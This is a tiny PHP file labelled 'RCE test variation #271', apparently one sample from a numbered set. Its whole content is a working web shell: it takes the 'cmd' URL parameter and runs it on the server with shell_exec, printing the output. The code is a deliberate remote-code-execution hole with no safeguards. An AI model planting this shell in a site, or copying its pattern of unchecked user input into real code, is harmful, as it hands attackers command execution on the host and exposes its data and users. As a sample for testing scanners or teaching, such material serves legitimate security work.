<?php
// RCE test variation #271
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>